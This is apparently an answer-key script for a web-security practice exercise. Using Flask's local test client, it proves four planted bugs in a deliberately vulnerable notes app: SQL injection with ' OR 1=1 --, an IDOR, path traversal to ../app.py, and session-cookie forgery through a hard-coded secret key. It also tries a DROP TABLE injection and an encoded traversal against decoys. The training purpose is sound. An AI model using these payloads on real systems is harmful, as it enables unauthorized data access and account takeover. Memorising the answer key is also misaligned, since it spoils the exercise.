"""Answer-key checker: proves each planted bug (and each decoy) against a
local copy of Leaky Notes, using Flask's built-in test client. No server,
no network, no port. Usage: python prove_bugs.py practice/leaky-notes
"""
import os
import runpy
import sys

target = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else "practice/leaky-notes")
sys.path.insert(0, target)
runpy.run_path(os.path.join(target, "seed.py"))
from app import app  # noqa: E402

from flask.sessions import SecureCookieSessionInterface  # noqa: E402


def login(client, user):
    r = client.post("/login", json={"username": user, "password": f"{user}-pw"})
    assert r.status_code == 200, r.status_code


def show(label, result):
    print(f"{label:<42} {result}")


c = app.test_client()
login(c, "alice")

# 1. SQL injection in /notes/search: alice reads bob's note.
r = c.get("/notes/search", query_string={"q": "' OR 1=1 --"})
show("BUG 1 SQL injection (search):", [n["title"] for n in r.get_json()])

# 2. IDOR on /invoices/<id>: alice reads bob's invoice.
r = c.get("/invoices/2")
show("BUG 2 IDOR (invoice 2 as alice):", r.get_json())

# 3. Path traversal on /attachments: read the app's own source.
r = c.get("/attachments", query_string={"name": "../app.py"})
show("BUG 3 path traversal (../app.py):", f"HTTP {r.status_code}, first line: {r.data.splitlines()[0].decode()}")

# 4. Hard-coded secret key: forge a session cookie for bob without his password.
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
forged = serializer.dumps({"user_id": 2})
attacker = app.test_client()
attacker.set_cookie("session", forged)
r = attacker.get("/notes")
show("BUG 4 forged cookie with known key:", [n["title"] for n in r.get_json()])

# Decoy A: the f-string ORDER BY only ever uses values from SORT_COLUMNS.
r = c.get("/notes", query_string={"sort": "title; DROP TABLE notes --"})
show("DECOY A sort=<injection attempt>:", f"HTTP {r.status_code}, {len(r.get_json())} note(s), table still there")

# Decoy B: send_from_directory refuses to leave the avatars folder.
r = c.get("/avatars/../app.py")
r2 = c.get("/avatars/..%2fapp.py")
show("DECOY B /avatars/../app.py:", f"HTTP {r.status_code} and {r2.status_code} (blocked)")
